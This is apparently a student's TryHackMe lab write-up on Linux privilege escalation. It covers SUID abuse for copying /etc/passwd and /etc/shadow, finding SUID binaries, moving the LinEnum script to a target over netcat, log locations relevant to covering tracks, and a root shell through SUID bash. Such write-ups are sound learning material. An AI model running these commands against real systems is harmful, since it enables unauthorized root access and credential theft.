# Day11 - The Rogue Gnome : Prelude

When accessing to a new machine, we should check __whoami__ giving us the name of the account we are in, and __echo $0__ to see what kind of shell we're using.

## The PrivEsc Checklist :

 - Determining the kernel of the machine (kernel exploitation such as DirtyCow)
 - Locating other services running of applications installed that may be abusable (SUID & out of date software)
 - Looking for automated scripts like backup scripts (crontabs)
 - Credentials (user account, application config files...)
 - Misconfigured file and directory permissions
 [This blog](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation) and [this github page](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation) are wonderful cheatsheets for privEsc.

## What is SUID :

SUID is simply a permission added to an executable that does a similar thing as sudo. However, instead, allows users to run the executable as whoever owns it as demonstrated below:

|Filename|File owner|User who is executing the file|User that the file is executed as|
|--------|----------|------------------------------|---------------------------------|
|ex1|root|cmnatic|root|
|ex2|cnmatic|cmnatic|cnmatic|
|ex3|service|danny|service|

Suddenly with the introduction of SUID, users no longer have to be a sudoer to run an executable as root. This can be legitimately used to allow applications that specific privileges to run that another user can't have.

### How to abuse SUID's:

First, to use it normally : `chmod u+s <example of binary such as /usr/bin/cp>`. Now the `cp` is gonna be used as root, even if we aren't root !

This means we can copy protected files as weak files; some interesting examples would be :

- copying the content of other directories (bash history, ssh keys,...)
- copying the content of the __/root/__ directory ! (/root/flag.txt :-))
- copy the __/etc/passwd__ and __/etc/shadow__ files for password cracking

We can find executables with SUID permissions by using 
`
find / -perm -u=s -type f 2>/dev/null
`

## LinEnum - does the enumeration work for us

`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

We have to turn our machine into a web server using python to serve the **LinEnum.sh** script to be downloaded onto the target machine. __In the same dir as the LinEnum.sh file__, we type `python3 -m http.server 8080`.

![nc-listener](https://github.com/oghobhainn/TryHackMe/blob/main/images/adventofcyber/day11/python-webserv.png)
Then we have to setup __netcat__ on the vulnerable instance to listen for an incoming file `nc -l -p 1337 > LinEnum.sh`.

![nc-listener](https://github.com/oghobhainn/TryHackMe/blob/main/images/adventofcyber/day11/nc-vuln.png)
And setup __netcat__ on our own machine to send a file `nc -w -3 $ip 1337 < LinEnum.sh`.

![nc-listener](https://github.com/oghobhainn/TryHackMe/blob/main/images/adventofcyber/day11/nv-own.png)
Adding the permission to the **LinENum.sh** file on the vulnerable instance `chmode +x 	LinEnum.sh`.

And finally execute the script on the vulerable machine.

## Covering our tracks

On Debian and Ubuntu, the majority of the actions concerned here (logging in, authentification, oploading/downloading files, ...) are logged by services and the system itself. Majority of these are in the `/var/log` directory and require admin priv. Can be `/var/log/auth.log`(attempted logins for SSH, changes too or logging in as systems users), `/var/log/syslog`(system events such as firewall alerts) ,...

## Challenge !

first we ssh onto the vulnerable machine `ssh cnmatic@$ip

by looking at SUID files `find / -perm -u=s -type f 2>/dev/null`, we see that (amongst others), there is the `bash` command. By typng `bash -p`, we get root ! easy as go. We know that by checking vulns on [GTFObins](https://gtfobins.github.io/).
